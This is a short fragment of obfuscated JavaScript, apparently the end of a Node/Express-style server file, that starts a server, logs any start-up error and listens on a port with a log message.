_0x1e31(_0x377944,_0x42eee3){_0x377944=_0x377944-0x1be;const _0x26fea9=_0x26fe();let _0x1e3175=_0x26fea9[_0x377944];return _0x1e3175;}startserver()['catch'](_0x143146=>{const _0x3eeb87=_0x4447c0;console[_0x3eeb87(0x1c0)](_0x3eeb87(0x1f0),_0x143146);}),app[_0x4447c0(0x202)](PORT,()=>console[_0x4447c0(0x274)](_0x4447c0(0x23b)+PORT+'!'));
